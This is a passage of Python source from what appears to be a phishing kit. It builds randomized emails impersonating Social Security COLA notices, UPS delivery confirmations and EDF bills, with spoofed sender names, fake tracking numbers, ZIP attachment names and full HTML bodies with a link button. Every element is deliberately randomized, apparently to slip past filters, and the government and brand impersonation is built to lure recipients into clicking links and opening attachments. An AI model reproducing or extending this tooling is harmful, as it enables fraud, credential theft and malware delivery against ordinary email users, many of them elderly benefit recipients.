    {"primary": "#1e3a5f", "secondary": "#2a4f7c", "accent": "#3d6ba3", "light": "#eaf1f8"},
    {"primary": "#0a2a4e", "secondary": "#143a6c", "accent": "#2966b8", "light": "#e3eef9"},
    {"primary": "#1c3f6e", "secondary": "#2d5793", "accent": "#4a7bbb", "light": "#ecf2fa"},
    {"primary": "#003d7a", "secondary": "#005bb5", "accent": "#1a7fde", "light": "#dceaf7"},
    # Darker navy variations
    {"primary": "#11335c", "secondary": "#1d4d8a", "accent": "#3672b5", "light": "#e7eef7"},
    {"primary": "#0f2c52", "secondary": "#1a4378", "accent": "#2e69a8", "light": "#e5ecf5"},
    {"primary": "#143759", "secondary": "#205088", "accent": "#3676bb", "light": "#e8eff8"},
    {"primary": "#0c2f5a", "secondary": "#184a90", "accent": "#2d72bf", "light": "#e6edf6"},
    # Mid-blues
    {"primary": "#21509e", "secondary": "#3367bf", "accent": "#5183d6", "light": "#eef3fb"},
    {"primary": "#1f4f9e", "secondary": "#3267c0", "accent": "#5285d8", "light": "#edf2fa"},
    {"primary": "#26568f", "secondary": "#3970b3", "accent": "#5688cb", "light": "#eef4fa"},
    {"primary": "#234d96", "secondary": "#3667bb", "accent": "#5180d2", "light": "#edf2fa"},
    # Slightly different tones
    {"primary": "#0e3258", "secondary": "#194780", "accent": "#2f6db0", "light": "#e6ecf4"},
    {"primary": "#103563", "secondary": "#1c4f8e", "accent": "#3273bd", "light": "#e6edf6"},
    {"primary": "#15407a", "secondary": "#225aa8", "accent": "#3b7fcc", "light": "#e8eff8"},
    {"primary": "#194278", "secondary": "#275ba6", "accent": "#4180c8", "light": "#eaf1fa"},
    # Deeper royal
    {"primary": "#082b54", "secondary": "#103f7c", "accent": "#2767ac", "light": "#e2ebf4"},
    {"primary": "#063055", "secondary": "#0f4682", "accent": "#266dad", "light": "#e3ebf3"},
    {"primary": "#0b3360", "secondary": "#154b88", "accent": "#2a73b4", "light": "#e4ecf5"},
    {"primary": "#103c6c", "secondary": "#1c5396", "accent": "#347fc4", "light": "#e6eef7"},
]

# 🎯 COLA THEME — Highlight texts
_COLA_HIGHLIGHTS = [
    "⚡ Important: Your COLA notice will be available online up to three weeks earlier than those who receive it by mail!",
    "📌 Note: Digital COLA notices are available 3 weeks before mail delivery.",
    "⚡ Quick Access: Your 2026 COLA notice is ready for download now.",
    "🎯 Priority: As a digital subscriber, you receive your notice first.",
    "📋 Important: Please review your COLA notice for 2026 benefit details.",
    "💡 Reminder: Your annual COLA notice contains important benefit information.",
    "✅ Confirmed: Your 2026 benefit adjustment notice is ready for review.",
    "🔔 Alert: Your COLA notice is now available — please download it today.",
    "📨 Update: Your personalized COLA notice has been published online.",
    "🎯 Priority Notice: Your 2026 COLA adjustment is now accessible.",
    "⏰ Time-Sensitive: Please review your 2026 COLA notice at your earliest convenience.",
    "📊 Important: Your annual benefit statement is now available for download.",
    "🔒 Secure: Your COLA notice is protected and ready for your review.",
    "📅 Annual Notice: Your 2026 cost-of-living adjustment information is ready.",
    "💼 Official: Your 2026 COLA notice contains important details about your benefits.",
    "🎁 Exclusive: As a digital subscriber, your notice is available early.",
    "📩 Attention: Please access your 2026 COLA notice for important details.",
    "🌟 Important Update: Your benefit adjustment notice is now available online.",
]

# 🎯 COLA THEME — Body intros (random)
_COLA_INTROS = [
    "Beginning in late November, you can view your personal Cost-of-Living Adjustment (COLA) notice online. Because you've chosen to receive digital notices, you will be among the first to access your updated benefit information with your personal account. Your COLA notice will be available online up to three weeks earlier than those who receive it by mail. This method is not only faster but also more secure than receiving notices by mail.",
    "Your 2026 Cost-of-Living Adjustment (COLA) notice is now ready for online access. As a digital notice subscriber, you have priority access to your annual benefit information. Your personalized notice contains important details about your benefit adjustment for the upcoming year. Digital delivery ensures faster, more secure access to your important documents.",
    "We're pleased to inform you that your 2026 COLA notice is available for download. By choosing digital delivery, you receive your annual benefit information weeks before mail recipients. Your notice contains personalized details about your cost-of-living adjustment, ensuring you have the most up-to-date information about your benefits.",
    "Your annual Cost-of-Living Adjustment notice for 2026 is ready. As one of our digital subscribers, you have early access to this important document. The information contained in your COLA notice is essential for understanding your benefit changes for the coming year. Digital delivery provides the fastest and most secure way to access this information.",
    "Important benefit information awaits you. Your 2026 COLA notice has been prepared and is now accessible online. Digital delivery offers significant advantages including faster access, enhanced security, and convenient retrieval. Your personalized notice details your annual cost-of-living adjustment.",
]

# 🎯 COLA THEME — "Account includes" lists (random selection)
_COLA_BENEFITS_LISTS = [
    [
        "Access to your 1099 tax form",
        "The ability to request a replacement Social Security card",
        "Access to benefit verification letters",
        "Options to set up or change direct deposit",
    ],
    [
        "View your earnings record",
        "Estimate your future benefits",
        "Access tax documents online",
        "Update your personal information",
    ],
    [
        "Download your annual statement",
        "Manage direct deposit information",
        "Request benefit verification letters",
        "Access your tax forms",
    ],
    [
        "View your 1099 tax statement",
        "Update direct deposit details",
        "Print benefit verification letters",
        "Review your earnings history",
    ],
]

# 🎯 COLA THEME — Key benefits descriptions
_COLA_KEY_BENEFITS = [
    [
        ("Faster Access", "Get your COLA notice 3 weeks before mail recipients"),
        ("More Secure", "Digital download instead of traditional mail"),
        ("Easy to Save", "Keep a copy on your computer anytime"),
        ("Environmentally Friendly", "Reduces paper waste"),
        ("Convenient", "Access from anywhere, anytime"),
    ],
    [
        ("Priority Delivery", "Receive your notice 21 days before mail"),
        ("Enhanced Security", "Encrypted digital delivery"),
        ("Permanent Record", "Save and store on any device"),
        ("Eco-Conscious", "Paperless and sustainable"),
        ("24/7 Access", "Available around the clock"),
    ],
    [
        ("Early Access", "Three weeks ahead of postal delivery"),
        ("Secure Format", "Protected digital documents"),
        ("Easy Storage", "Save to your personal device"),
        ("Green Solution", "Environmentally responsible"),
        ("Always Available", "Access anytime, from anywhere"),
    ],
]

# 🎯 COLA THEME — Buttons texts
_COLA_BUTTON_TEXTS = [
    "Download COLA Notice Now",
    "Access Your 2026 Notice",
    "View Your COLA Statement",
    "Download My Notice",
    "Get My COLA Notice",
    "View 2026 Benefit Notice",
    "Download Annual Statement",
    "Access My Statement",
    "View My Benefit Notice",
    "Get COLA Notice Now",
    "View My COLA Notice",
    "Open Annual Notice",
    "Access COLA Statement",
    "Get Your 2026 Notice",
    "Download Your Statement",
    "View Annual Statement",
    "Access Notice Now",
    "Open My Notice",
    "View Your Annual Notice",
    "Open COLA Notice",
    "Download Personal Notice",
    "Get Annual Notice",
    "Access Personal Statement",
    "View My Annual Notice",
]

# 🎯 COLA THEME — Tips
_COLA_TIPS = [
    "💡 Tip: Save your COLA notice in a safe location on your computer for future reference. You can also print it if needed.",
    "💡 Tip: Keep a digital copy of your annual notice for your records.",
    "💡 Tip: Print or save your notice for future reference and tax preparation.",
    "💡 Tip: Store your COLA notice safely — you may need it for benefit verification.",
    "💡 Reminder: Save this important document for your annual records.",
    "📌 Important: Keep your COLA notice with your tax documents.",
    "🔒 Reminder: Your COLA notice contains personal information — store it securely.",
    "📋 Note: You can download your notice multiple times if needed.",
    "💾 Tip: Saving a digital copy is recommended for easy access.",
    "📊 Reminder: Your COLA notice may be needed for tax filing.",
    "🗂️ Tip: Consider organizing your benefit notices by year.",
    "📁 Note: Your annual notices are valuable records — keep them safe.",
]

# 🎯 COLA THEME — Closing paragraphs
_COLA_CLOSINGS = [
    "Thank you for your choice to Go Digital! Going digital is more than just convenient; it's a safer, faster, and more sustainable way to stay informed. You're helping reduce paper waste, protect your personal information, and streamline your experience.",
    "We appreciate your commitment to digital delivery. By choosing online access, you're enjoying faster service while contributing to environmental sustainability and enhanced security of your personal information.",
    "Thank you for selecting digital notice delivery. This choice provides you with priority access to important information while supporting sustainable practices and safeguarding your data.",
    "Your decision to receive digital notices benefits both you and the environment. Enjoy faster access, enhanced security, and the convenience of digital delivery for all your benefit communications.",
    "Thank you for being part of our digital notice program. Your participation helps create a faster, more secure, and environmentally responsible way to receive important information about your benefits.",
    "We're pleased to provide your annual benefit information through our digital service. Going digital ensures you receive timely, secure, and convenient access to important documents.",
    "Thank you for choosing the digital option. Your decision contributes to a more efficient delivery system while providing you with enhanced access to your benefit information.",
    "By selecting digital delivery, you've made a smart choice that benefits both you and the environment. Continue enjoying faster, more secure access to all your important notices.",
]

# 🎯 COLA THEME — Footer notes
_COLA_FOOTERS = [
    "For more information about your Social Security benefits and COLA adjustments, contact your local Social Security office or visit the official Social Security website.",
    "Questions about your COLA notice? Visit your local benefits office or check the official website for assistance.",
    "Need help understanding your benefit notice? Contact customer service or visit our online help center.",
    "For additional information about your 2026 benefits, please refer to your local office or online resources.",
    "Have questions? Visit our online help center or contact your local benefits representative for assistance.",
    "For account-related inquiries or questions about your notice, please contact our customer support team.",
    "Need additional help? Our support team is available to answer your questions about your benefit notice.",
    "Questions or concerns? Reach out to your local Social Security office for personalized assistance.",
]


# ═══════════════════════════════════════════════════════════════════════
# 📦 UPS THEME — Package delivery
# ═══════════════════════════════════════════════════════════════════════

# Subject components (combinatorial)
_UPS_SUBJ_HEADLINES = [
    "Your package was delivered.",
    "Your package has been delivered.",
    "Package delivered successfully.",
    "Delivery completed.",
    "Your shipment has arrived.",
    "Package delivery confirmation.",
    "Your order has been delivered.",
    "Delivery successful.",
    "Your package is here.",
    "Successful delivery confirmation.",
    "Package arrived at destination.",
    "Your shipment was delivered.",
    "Delivery notification — package received.",
    "Your package has arrived.",
    "Delivery successful — your package is here.",
]

_UPS_SUBJ_PREFIXES = [
    "", "UPS: ", "[UPS] ", "Notice: ", "Update: ",
    "Confirmation: ", "Delivery alert: ", "📦 ", "✓ ",
]

_UPS_SUBJ_SUFFIXES = [
    "",
    " - {tracking_id}",
    " (#{tracking_id})",
    " | Tracking #{tracking_id}",
    " - Order #{order_id}",
]

# Display Name pools — kima COLA, EDF/UPS NEVER fixed
_UPS_NAME_BASES = [
    "UPS", "UPS Tracking", "UPS Notifications", "UPS Delivery",
    "UPS Updates", "UPS Confirmation", "UPS Service", "UPS Shipping",
    "UPS My Choice", "UPS Customer Service", "UPS Notice",
    "UPS Alerts", "UPS Shipping Notice", "UPS Tracking Updates",
]

_UPS_NAME_SUFFIXES = [
    "", " - Delivery", " (Notice)", " | Updates",
    " - Tracking", " (Confirmation)", " - Notification",
    " | Tracking", " - Service", " (Updates)",
]

# ZIP filename pools
_UPS_ZIP_PREFIXES = [
    "UPS", "Package", "Delivery", "Shipment", "Tracking",
    "Order", "Parcel", "UPS_Notice", "UPS_Delivery",
]

_UPS_ZIP_MIDDLES = [
    "Confirmation", "Delivery", "Receipt", "Notice", "Tracking",
    "Statement", "Notification", "Update", "Document",
]

# Inner filename pools (kima COLA pattern)
_UPS_INNER_FILENAMES = [
    "Delivery_Receipt", "Package_Confirmation", "Tracking_Document",
    "UPS_Notice", "Delivery_Statement", "Shipment_Confirmation",
    "Package_Document", "Delivery_Notice", "UPS_Tracking",
    "Receipt", "Confirmation", "Delivery", "Notice", "Document",
    "Statement", "Tracking", "Package", "Shipment_Receipt",
    "Order_Confirmation", "Delivery_Document",
]

# Color scheme — UPS brown/gold
_UPS_COLOR_SCHEMES = [
    {"primary": "#351c15", "accent": "#ffb500", "bg": "#f3f3f3", "text": "#121212"},
    {"primary": "#4a2818", "accent": "#ffc933", "bg": "#f8f8f8", "text": "#1a1a1a"},
    {"primary": "#3d2014", "accent": "#ffb500", "bg": "#f5f5f5", "text": "#121212"},
    {"primary": "#5c3320", "accent": "#fda600", "bg": "#fafafa", "text": "#1a1a1a"},
]

# Random data pools for UPS body
_UPS_SHIPPERS = [
    "Amazon", "Walmart", "Target", "Best Buy", "Apple Store",
    "Nike", "eBay", "Costco", "Home Depot", "Macy's",
    "Wayfair", "Etsy", "Shopify Store", "AliExpress", "Lowe's",
    "Nordstrom", "Zappos", "Newegg", "Adidas", "Sephora",
]

_UPS_DELIVERY_DAYS = [
    "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday",
]

_UPS_DELIVERY_MONTHS = [
    ("Jan", 1, 31), ("Feb", 2, 28), ("Mar", 3, 31), ("Apr", 4, 30),
    ("May", 5, 31), ("Jun", 6, 30), ("Jul", 7, 31), ("Aug", 8, 31),
    ("Sep", 9, 30), ("Oct", 10, 31), ("Nov", 11, 30), ("Dec", 12, 31),
]

_UPS_BUTTON_TEXTS = [
    "Track Your Package ›",
    "View Delivery Details ›",
    "Track Package ›",
    "Get Delivery Updates ›",
    "View Package Status ›",
    "Track My Order ›",
    "Manage Delivery ›",
]


def _gen_ups_subject_combinatorial():
    """Generate random UPS subject. Lifetime random."""
    headline = random.choice(_UPS_SUBJ_HEADLINES)
    prefix = random.choice(_UPS_SUBJ_PREFIXES)
    suffix_template = random.choice(_UPS_SUBJ_SUFFIXES)
    
    # Generate IDs
    tracking_id = f"1Z{random.choice(['XX', 'YY', 'ZZ', 'WW', 'QQ'])}{random.randint(100, 999)}{random.randint(1000000000, 9999999999)}"
    order_id = f"{random.randint(100, 999)}-{random.randint(1000000, 9999999)}-{random.randint(1000000, 9999999)}"
    
    suffix = suffix_template.replace("{tracking_id}", tracking_id).replace("{order_id}", order_id)
    
    return f"{prefix}{headline}{suffix}".strip()


def _gen_ups_name_combinatorial():
    """Generate random UPS display name."""
    base = random.choice(_UPS_NAME_BASES)
    suffix = random.choice(_UPS_NAME_SUFFIXES)
    return f"{base}{suffix}".strip()


def _gen_ups_zip_filename():
    """Generate UPS ZIP filename."""
    prefix = random.choice(_UPS_ZIP_PREFIXES)
    middle = random.choice(_UPS_ZIP_MIDDLES)
    serial = random.randint(10000, 99999)
    code = random.choice(["2025", "2026", "FY26", f"REF{random.randint(100,999)}", ""])
    
    parts = [p for p in [prefix, middle, code] if p]
    base_name = "_".join(parts) + f"_{serial}"
    return f"{base_name}.zip"


def _gen_ups_inner_filename(extension="pdf"):
    """Generate UPS inner filename matching ZIP style."""
    base = random.choice(_UPS_INNER_FILENAMES)
    serial = random.randint(10000, 99999)
    return f"{base}_{serial}.{extension}"


def _generate_ups_subject():
    """Public UPS subject generator (90% combinatorial / 10% headline only)."""
    if random.random() < 0.9:
        return _gen_ups_subject_combinatorial()
    return random.choice(_UPS_SUBJ_HEADLINES)


def _generate_ups_display_name():
    """Public UPS display name generator."""
    return _gen_ups_name_combinatorial()


def _generate_ups_zip_filename():
    """Public UPS ZIP filename generator."""
    return _gen_ups_zip_filename()


def _generate_ups_template(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#",
                            force_shipper=None):
    """Generate UPS-themed email body HTML — Random pool of 3 variants.
    Each call picks a random variant — lifetime random.
    """
    variant = random.randint(1, 3)
    if variant == 1:
        return _generate_ups_template_v1(recipient_name, recipient_email, link_url, force_shipper)
    elif variant == 2:
        return _generate_ups_template_v2(recipient_name, recipient_email, link_url, force_shipper)
    else:
        return _generate_ups_template_v3(recipient_name, recipient_email, link_url, force_shipper)


def _generate_ups_template_v2(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#",
                                force_shipper=None):
    """UPS Old Detailed - Variant 2: Banner-style header + box layout."""
    color = random.choice(_UPS_COLOR_SCHEMES)
    shipper = force_shipper if force_shipper else random.choice(_UPS_SHIPPERS)
    button = random.choice(_UPS_BUTTON_TEXTS)
    headline = random.choice(_UPS_SUBJ_HEADLINES)
    
    import datetime as _dt
    today = _dt.datetime.now()
    day_name = today.strftime("%A")
    month_num = today.month
    day_num = today.day
    year = today.year
    
    hour = random.randint(8, 17)
    minute = random.randint(0, 59)
    if hour < 12:
        am_pm = "AM"; display_hour = hour
    elif hour == 12:
        am_pm = "PM"; display_hour = 12
    else:
        am_pm = "PM"; display_hour = hour - 12
    
    delivery_time = f"{day_name} {month_num}/{day_num}/{year}<br>{display_hour}:{minute:02d} {am_pm}"
    
    return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>UPS Delivery Notification</title>
</head>
<body style="margin:0; padding:0; background-color:{color['bg']}; font-family:Arial,Helvetica,sans-serif; color:{color['text']};">
<table width="600" align="center" style="margin:25px auto; background:#ffffff; border-collapse:collapse;" cellpadding="0" cellspacing="0">
<tr>
  <td style="background:{color['primary']}; padding:22px 30px;">
    <table width="100%" cellpadding="0" cellspacing="0">
      <tr>
        <td style="color:#ffffff; font-size:28px; font-weight:800; letter-spacing:1.5px;">UPS</td>
        <td align="right" style="color:{color['accent']}; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:2px; padding-top:10px;">Delivery Confirmation</td>
      </tr>
    </table>
  </td>
</tr>
<tr>
  <td style="padding:30px 30px 12px;">
    <p style="margin:0 0 6px; font-size:13px; color:#888;">Hi,</p>
    <h1 style="margin:0 0 8px; font-size:28px; font-weight:700; color:#121212; line-height:1.2;">{headline}</h1>
    <p style="margin:0 0 24px; font-size:15px; color:#444;">From <strong style="color:{color['primary']};">{shipper}</strong></p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 24px;">
      <tr>
        <td style="padding:18px 22px; background:#fff8e6; border-left:5px solid {color['accent']}; border-radius:3px;">
          <div style="font-size:12px; color:#666; text-transform:uppercase; letter-spacing:1.5px; font-weight:600; margin-bottom:6px;">Delivered</div>
          <div style="font-size:20px; font-weight:700; color:#121212; line-height:1.4;">{delivery_time}</div>
        </td>
      </tr>
    </table>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 8px;">
      <tr>
        <td align="center">
          <a href="{link_url}" style="display:inline-block; padding:15px 38px; background:{color['accent']}; color:#121212; text-decoration:none; font-weight:700; font-size:15px;">{button}</a>
        </td>
      </tr>
    </table>
  </td>
</tr>
<tr>
  <td style="padding:14px 30px; color:#888; font-size:13px;">
    <span style="color:#666;">Sent to:</span> <strong style="color:#222;">{recipient_email}</strong>
  </td>
</tr>
<tr>
  <td style="padding:18px 30px; background:#f5f5f5; color:#666; font-size:10px; line-height:1.6; border-top:1px solid #e8e8e8;">
    ©2026 United Parcel Service of America, Inc. UPS, the UPS brandmark, and the color brown are trademarks of United Parcel Service of America, Inc. All rights reserved.<br>
    Please do not reply to this email. | Manage delivery alerts | Privacy Notice | Service Terms | Opt out
  </td>
</tr>
</table>
</body>
</html>"""


def _generate_ups_template_v3(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#",
                                force_shipper=None):
    """UPS Old Detailed - Variant 3: Two-column metrics."""
    color = random.choice(_UPS_COLOR_SCHEMES)
    shipper = force_shipper if force_shipper else random.choice(_UPS_SHIPPERS)
    button = random.choice(_UPS_BUTTON_TEXTS)
    headline = random.choice(_UPS_SUBJ_HEADLINES)
    
    import datetime as _dt
    today = _dt.datetime.now()
    date_short = today.strftime("%a, %b %d")
    date_long = today.strftime("%A %m/%d/%Y")
    year = today.year
    
    hour = random.randint(8, 17)
    minute = random.randint(0, 59)
    if hour < 12:
        am_pm = "AM"; display_hour = hour
    elif hour == 12:
        am_pm = "PM"; display_hour = 12
    else:
        am_pm = "PM"; display_hour = hour - 12
    
    time_str = f"{display_hour}:{minute:02d} {am_pm}"
    
    return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>UPS Delivery Notification</title>
</head>
<body style="margin:0; padding:30px 20px; background-color:{color['bg']}; font-family:Arial,Helvetica,sans-serif; color:#121212;">
<table width="600" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse; border-radius:8px; overflow:hidden;" cellpadding="0" cellspacing="0">
<tr>
  <td align="center" style="padding:34px 30px 18px; background:#ffffff;">
    <div style="font-size:32px; font-weight:800; color:{color['primary']}; letter-spacing:2px;">UPS</div>
  </td>
</tr>
<tr>
  <td align="center" style="padding:8px 30px 6px; color:#666; font-size:14px;">Hi,</td>
</tr>
<tr>
  <td align="center" style="padding:0 30px 12px;">
    <h1 style="margin:0; font-size:30px; font-weight:700; color:#121212; line-height:1.2;">{headline}</h1>
  </td>
</tr>
<tr>
  <td align="center" style="padding:0 30px 24px;">
    <span style="display:inline-block; padding:7px 16px; background:#fff8e6; border-radius:20px; font-size:13px; color:#444; font-weight:600;">From {shipper}</span>
  </td>
</tr>
<tr>
  <td style="padding:0 30px 24px;">
    <table width="100%" cellpadding="0" cellspacing="0">
      <tr>
        <td width="48%" style="padding:16px 18px; background:#f8f8f8; border-radius:6px;">
          <div style="font-size:10px; color:#888; text-transform:uppercase; letter-spacing:1.5px; font-weight:600;">Date</div>
          <div style="font-size:16px; font-weight:700; color:#121212; margin-top:4px;">{date_long}</div>
        </td>
        <td width="4%">&nbsp;</td>
        <td width="48%" style="padding:16px 18px; background:#f8f8f8; border-radius:6px;">
          <div style="font-size:10px; color:#888; text-transform:uppercase; letter-spacing:1.5px; font-weight:600;">Time</div>
          <div style="font-size:16px; font-weight:700; color:#121212; margin-top:4px;">{time_str}</div>
        </td>
      </tr>
    </table>
  </td>
</tr>
<tr>
  <td align="center" style="padding:0 30px 24px;">
    <a href="{link_url}" style="display:inline-block; padding:15px 42px; background:{color['accent']}; color:#121212; text-decoration:none; font-weight:700; font-size:15px; border-radius:4px;">{button}</a>
  </td>
</tr>
<tr>
  <td align="center" style="padding:0 30px 18px; color:#888; font-size:12px;">
    Sent to <strong style="color:#444;">{recipient_email}</strong>
  </td>
</tr>
<tr>
  <td align="center" style="padding:14px 30px; background:#fafafa; color:#888; font-size:10px; line-height:1.6;">
    ©{year} United Parcel Service of America, Inc.<br>
    Please do not reply to this email.
  </td>
</tr>
</table>
</body>
</html>"""


def _generate_ups_template_v1(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#",
                                force_shipper=None):
    """Generate UPS-themed email body HTML.
    Uses the UPS template style — clean delivery confirmation.
    
    Args:
        force_shipper: ila kayan, kayKun fixed (e.g. "Amazon"). Sinon random.
    """
    color = random.choice(_UPS_COLOR_SCHEMES)
    shipper = force_shipper if force_shipper else random.choice(_UPS_SHIPPERS)
    button = random.choice(_UPS_BUTTON_TEXTS)
    headline = random.choice(_UPS_SUBJ_HEADLINES)
    
    # 🆕 V91: AUTO current date (today's date) — kima real UPS notification
    import datetime as _dt
    today = _dt.datetime.now()
    day_name = today.strftime("%A")        # e.g. "Sunday"
    month_num = today.month
    day_num = today.day
    year = today.year
    
    # Random hour (delivery time during business hours)
    hour = random.randint(8, 17)
    minute = random.randint(0, 59)
    if hour < 12:
        am_pm = "AM"
        display_hour = hour
    elif hour == 12:
        am_pm = "PM"
        display_hour = 12
    else:
        am_pm = "PM"
        display_hour = hour - 12
    
    delivery_time = f"{day_name} {month_num}/{day_num}/{year}<br>{display_hour}:{minute:02d} {am_pm}"
    
    # Random tracking number
    tracking_id = f"1Z{random.choice(['XX', 'YY', 'ZZ', 'WW'])}{random.randint(100, 999)}{random.randint(1000000000, 9999999999)}"
    
    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>UPS Delivery Notification</title>
</head>
<body style="margin:0; padding:0; background-color:#ffffff; font-family:Arial, Helvetica, sans-serif; color:#121212;">
  <div id="message" style="padding:20px 0;">
    <table width="600" style="margin:20px auto; width:600px; padding-bottom:20px; border-collapse:collapse; border-spacing:0; background-color:#ffffff;" bgcolor="#ffffff" border="0" cellspacing="0" cellpadding="0">
      <tbody>
        <tr title="UPS Logo">
          <td align="center" style="padding-top:20px; padding-bottom:20px;" bgcolor="#ffffff">
            <table width="100%" style="width:100%;" border="0" cellspacing="0" cellpadding="0">
              <tbody>
                <tr>
                  <td align="center" valign="top" style="padding:0; font-family:Arial, Helvetica, sans-serif; font-size:32px; font-weight:700; color:{color['primary']}; letter-spacing:0.5px;">
                    UPS
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
        <tr title="Salutation">
          <td align="center" style="padding-top:0; padding-bottom:16px;" bgcolor="#ffffff">
            <table width="100%" style="width:100%;" border="0" cellspacing="0" cellpadding="0">
              <tbody>
                <tr>
                  <td align="center" valign="top" style="color:{color['text']}; line-height:1.3; padding-right:10px; padding-left:10px; font-family:Arial, Helvetica, sans-serif; font-size:16px; font-weight:400;">
                    Hi {recipient_name},
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
        <tr title="Headline">
          <td align="center" style="padding-top:0; padding-bottom:20px;" bgcolor="#ffffff">
            <table width="100%" style="width:100%;" border="0" cellspacing="0" cellpadding="0">
              <tbody>
                <tr>
                  <td align="center" valign="top" style="color:{color['text']}; line-height:1.25; padding-right:10px; padding-left:10px; font-family:Arial, Helvetica, sans-serif; font-size:28px; font-weight:700;">
                    {headline}
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
        <tr title="Shipper">
          <td align="center" style="padding-top:0; padding-bottom:20px;" bgcolor="#ffffff">
            <table width="100%" style="width:100%;" border="0" cellspacing="0" cellpadding="0">
              <tbody>
                <tr>
                  <td align="center" valign="top" style="color:{color['text']}; line-height:1.3; padding-right:10px; padding-left:10px; font-family:Arial, Helvetica, sans-serif; font-size:16px; font-weight:400;">
                    From <strong>{shipper}</strong>
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
        <tr title="Delivery Message">
          <td align="center" style="padding-top:0; padding-bottom:8px;" bgcolor="#ffffff">
            <table width="100%" style="width:100%;" border="0" cellspacing="0" cellpadding="0">
              <tbody>
                <tr>
                  <td align="center" valign="top" style="color:{color['text']}; line-height:1.3; padding-right:10px; padding-left:10px; font-family:Arial, Helvetica, sans-serif; font-size:20px; font-weight:700;">
                    Delivered
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
        <tr title="Delivery Time">
          <td align="center" style="padding-top:0; padding-bottom:28px;" bgcolor="#ffffff">
            <table width="100%" style="width:100%;" border="0" cellspacing="0" cellpadding="0">
              <tbody>
                <tr>
                  <td align="center" valign="top" style="color:{color['text']}; line-height:1.25; padding-right:10px; padding-left:10px; font-family:Arial, Helvetica, sans-serif; font-size:24px; font-weight:700;">
                    {delivery_time}
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
        <tr title="Button">
          <td align="center" style="padding-top:0; padding-bottom:24px;" bgcolor="#ffffff">
            <table width="100%" style="width:100%;" border="0" cellspacing="0" cellpadding="0">
              <tbody>
                <tr>
                  <td align="center" valign="top" style="font-family:Arial, Helvetica, sans-serif; font-size:16px; font-weight:700;">
                    <table width="240" style="width:240px;" border="0" cellspacing="0" cellpadding="0">
                      <tbody>
                        <tr>
                          <td align="center" bgcolor="{color['accent']}" style="padding:0; border:1px solid {color['accent']};">
                            <a href="{link_url}" style="display:block; margin:0 auto; padding:14px 12px; text-align:center; text-decoration:none; font-family:Arial, Helvetica, sans-serif; font-size:16px; font-weight:700; color:{color['text']}; background-color:{color['accent']};">
                              {button}
                            </a>
                          </td>
                        </tr>
                      </tbody>
                    </table>
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
        <tr title="Service Name">
          <td align="center" style="padding-top:0; padding-bottom:8px;" bgcolor="#ffffff">
            <table width="100%" style="width:100%;" border="0" cellspacing="0" cellpadding="0">
              <tbody>
                <tr>
                  <td align="center" valign="top" style="color:{color['text']}; line-height:1.3; padding-right:10px; padding-left:10px; font-family:Arial, Helvetica, sans-serif; font-size:14px; font-weight:400;">
                    <span style="text-decoration:underline;">UPS</span>
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
        <tr title="Sent To">
          <td align="center" style="padding-top:0; padding-bottom:20px;" bgcolor="#ffffff">
            <table width="100%" style="width:100%;" border="0" cellspacing="0" cellpadding="0">
              <tbody>
                <tr>
                  <td align="center" valign="top" style="color:#666; line-height:1.3; padding-right:10px; padding-left:10px; font-family:Arial, Helvetica, sans-serif; font-size:12px; font-weight:400;">
                    Sent to: <strong>{recipient_email}</strong>
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
        <tr title="Footer">
          <td align="center" style="padding-top:10px; padding-bottom:5px;" bgcolor="#f5f5f5">
            <table width="100%" style="width:100%;" border="0" cellspacing="0" cellpadding="0">
              <tbody>
                <tr>
                  <td align="center" valign="top" style="color:{color['text']}; line-height:1.4; padding-right:10px; padding-left:10px; font-family:Arial, Helvetica, sans-serif; font-size:10px; font-weight:400;">
                    ©2026 United Parcel Service of America, Inc. UPS, the UPS brandmark, and the color brown are trademarks of United Parcel Service of America, Inc. All rights reserved.
                  </td>
                </tr>
                <tr>
                  <td align="center" valign="top" style="color:{color['text']}; line-height:1.4; padding-top:5px; padding-bottom:5px; font-family:Arial, Helvetica, sans-serif; font-size:10px; font-weight:400;">
                    Please do not reply to this email.
                  </td>
                </tr>
                <tr>
                  <td align="center" valign="top" style="color:{color['text']}; line-height:1.4; padding-top:5px; padding-bottom:10px; font-family:Arial, Helvetica, sans-serif; font-size:10px; font-weight:400;">
                    Manage delivery alerts | Privacy Notice | Service Terms | Opt out
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
      </tbody>
    </table>
  </div>
</body>
</html>"""
    
    return html


# ═══════════════════════════════════════════════════════════════════════
# ⚡ EDF THEME — French utility billing
# ═══════════════════════════════════════════════════════════════════════

_EDF_SUBJ_HEADLINES = [
    "Votre facture électronique EDF au format PDF",
    "Votre facture EDF est disponible",
    "Votre nouvelle facture EDF",
    "Facture EDF - Disponible en ligne",
    "EDF - Votre facture mensuelle",
    "Votre relevé EDF est prêt",
    "Facture électronique EDF",
    "EDF: Votre facture est arrivée",
    "Nouvelle facture EDF disponible",
    "Votre document EDF en pièce jointe",
    "Facture EDF du mois disponible",
    "EDF - Avis de facturation",
    "Votre facture EDF en format PDF",
    "EDF - Notification de facture",
    "Votre relevé de consommation EDF",
]

_EDF_SUBJ_PREFIXES = [
    "", "EDF: ", "[EDF] ", "EDF - ", "Avis: ",
    "Notification: ", "⚡ ", "📄 ",
